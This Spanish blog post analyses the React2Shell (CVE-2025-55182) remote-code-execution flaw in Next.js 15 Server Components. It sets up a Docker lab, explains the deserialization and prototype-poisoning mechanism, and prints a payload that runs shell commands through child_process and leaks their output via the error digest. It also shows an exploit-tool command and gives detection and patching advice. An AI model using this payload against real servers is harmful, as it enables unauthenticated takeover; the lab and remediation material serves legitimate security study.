---
title: React2Shell (CVE-2025-55182) - Vulnerabilidad Crítica en React Server Components
description: Análisis profundo de la vulnerabilidad React2Shell que afecta a Next.js 15.x. Aprende cómo funciona el exploit, cómo montar un laboratorio de pruebas con Docker y técnicas de exfiltración avanzadas.
snippetone: POC
category: POC
SEOTitle: React2Shell CVE-2025-55182 - Vulnerabilidad RCE en Next.js
lang: es
date: 2025-12-10
---

Recientemente, el ecosistema de JavaScript se ha visto sacudido por una vulnerabilidad crítica con **CVSS 10.0**: **React2Shell (CVE-2025-55182)**. Esta vulnerabilidad afecta a componentes centrales de React Server Components (RSC) y, por extensión, a configuraciones por defecto de Next.js 15.x.

Lo que hace a esta vulnerabilidad especialmente peligrosa no es solo que permita RCE (Remote Code Execution) sin autenticación, sino que reside en la propia arquitectura de comunicación entre cliente y servidor, en un protocolo interno llamado **"Flight"**.

En este post, vamos a diseccionar la vulnerabilidad, montar un laboratorio con Docker y explotarla utilizando técnicas avanzadas de exfiltración de errores.


![Diagrama de arquitectura del ataque React2Shell](/static/blog/img/reactDiagram.png)

## La Teoría detrás del Caos: ¿Qué falló en React?

Para entender React2Shell, debemos olvidar el modelo mental tradicional de "Petición HTTP → Respuesta HTML". En el mundo de los React Server Components, la comunicación se parece más a un protocolo binario complejo.

### El Protocolo Flight

Cuando un navegador solicita una página Next.js moderna, el servidor no siempre responde con HTML plano. Utiliza un protocolo de serialización llamado **Flight**. Este protocolo transmite el árbol de componentes (Component Tree) como un flujo de datos que hidrata al cliente progresivamente.

El fallo reside en el motor de deserialización de este protocolo en el servidor. A diferencia de un `JSON.parse` seguro, Flight maneja conceptos vivos de JavaScript como Referencias, Mapas y Promesas.



### La Trampa del "Thenable" y la Confusión de Tipos

Aquí es donde entra la magia del exploit. En JavaScript, cualquier objeto que tenga una propiedad llamada `.then` es tratado como una Promesa (un "Thenable").

El parser de React en el servidor confiaba ciegamente en la estructura entrante:

1. **Inyección**: Enviamos un payload JSON manipulado con una propiedad `"then"`.

2. **Confusión**: El servidor deserializa el objeto. Al ver `.then`, asume que es una Promesa legítima que debe resolver.

3. **Ejecución**: React intenta "ejecutar" esa promesa.

4. **Prototype Poisoning**: Al no poder inyectar funciones directamente, usamos referencias a `__proto__` o `constructor` dentro de ese `.then`. Esto engaña al motor para que ejecute el constructor de funciones de JavaScript (similar a un `eval`), dándonos acceso a primitivas de Node.js como `process` o `require`.



## El Laboratorio: Montando la Víctima

Para probar esto de forma segura, he creado un entorno Dockerizado que levanta una instancia de Next.js 15.0.0 (vulnerable) con App Router habilitado.

He tenido que ajustar el Dockerfile para evitar los prompts interactivos de `create-next-app` que fallaban en la construcción automática.

### Dockerfile

```dockerfile
FROM node:20-alpine
WORKDIR /app
RUN apk add --no-cache libc6-compat
RUN npx --yes create-next-app@15.0.0 my-vulnerable-app \
    --use-npm \
    --ts \
    --eslint \
    --tailwind \
    --src-dir \
    --app \
    --import-alias "@/*" \
    --no-turbopack \
    --yes 

WORKDIR /app/my-vulnerable-app
RUN npm install
EXPOSE 3000

CMD ["npm", "run", "dev"]
```

### docker-compose.yml

```yaml
version: '3.8'

services:
  react2shell-victim:
    build: .
    ports:
      - "3000:3000"
    networks:
      - lab-network
    environment:
      - NODE_ENV=development

networks:
  lab-network:
    driver: bridge
```

Para levantar el entorno:

```bash
sudo docker compose up --build
```


## Explotación: Del "Blind RCE" a la Exfiltración

Al principio, intentar explotar esto puede ser frustrante. Los primeros PoCs eran "ciegos": inyectabas un `touch /tmp/pwned` y tenías que entrar al servidor para verificar si el archivo existía, porque el servidor simplemente devolvía un error 500 o cerraba la conexión.

Sin embargo, la técnica ha evolucionado hacia un **"Weaponized Exploit"** que utiliza el propio manejo de errores de React para exfiltrar datos.

### El Exploit Avanzado

He utilizado la herramienta **[NextRCE](https://github.com/ynsmroztas/NextRce)** que automatiza el proceso. Lo brillante de este exploit es que no necesita un Server Action ID válido (ataca endpoints inexistentes interceptados por el router) y recupera la salida del comando.

El payload clave hace algo así:

```javascript
var res = process.mainModule.require('child_process').execSync('id').toString('base64');
// LANZA UN ERROR INTENCIONAL
throw Object.assign(new Error('x'), { digest: res });
```

React captura este error y, pensando que es un código de error legítimo (`digest`), se lo envía al cliente. ¡Boom! Tenemos la salida del comando en la respuesta HTTP.

### Ejecutando el ataque

Usando el script de Python `nextrce.py`:

```bash
python3 nextrce.py -u http://localhost:3000 --cmd id
```

El resultado es inmediato:

![Ejecución exitosa mostrando el UID del usuario en el contenedor](/static/blog/img/reactexpl.png)


## Detección Masiva

Para identificar si tienes activos vulnerables, **Assetnote** ha publicado un escáner en Go que no explota, sino que detecta la firma de la deserialización insegura.

**Repositorio**: [react2shell-scanner](https://github.com/assetnote/react2shell-scanner)

```bash
python3 scanner.py -u http://localhost:3000
```

![El escáner confirmando que el endpoint es vulnerable](/static/blog/img/reactscanner.png)


## Remediación

La solución es urgente y directa. No hay WAF que garantice protección total debido a la complejidad de serialización del payload.

### Pasos de mitigación:

- **Actualizar Next.js**: Versión **15.1.0** o superior.

- **Actualizar React**: Versión **19.2.0 (Stable)** o superior.

**Importante:** Si no puedes actualizar, deshabilita temporalmente el App Router si no es crítico, aunque esto suele romper la aplicación.


## Conclusión

React2Shell nos recuerda que la complejidad en el desarrollo moderno tiene un precio. Al difuminar la línea entre el cliente y el servidor con protocolos de serialización complejos, abrimos nuevas superficies de ataque que escapan a las validaciones tradicionales de entrada.

Esta vulnerabilidad demuestra que la innovación en frameworks modernos debe ir acompañada de una revisión exhaustiva de seguridad, especialmente cuando se introducen nuevos protocolos de comunicación entre cliente y servidor.

## 📚 Referencias

- [React2Shell](https://react2shell.com)
- [React2Shell Scanner](https://github.com/assetnote/react2shell-scanner)
- [NextRCE](https://github.com/ynsmroztas/NextRce)